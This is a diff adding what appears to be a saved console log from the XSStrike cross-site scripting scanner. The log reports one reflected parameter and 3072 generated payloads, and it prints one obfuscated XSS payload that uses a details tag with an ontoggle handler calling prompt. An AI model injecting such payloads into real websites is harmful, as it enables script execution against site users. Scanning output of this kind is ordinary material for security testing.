@@ -1,0 +1,15 @@
+
+	XSStrike v3.1.4
+
+ Checking for DOM vulnerabilities 
+ WAF Status: Offline 
+ Testing parameter: xss 
+ Reflections found: 1 
+ Analysing reflections 
+ Generating payloads 
+ Payloads generated: 3072 
+ Progress: 1/3072 ------------------------------------------------------------
+ Payload: <deTaiLs%0dOnToGGle%0d=%0d(prompt)``%0dx> 
+ Efficiency: 100 
+ Confidence: 10 
+ Would you like to continue scanning? [y/N] 
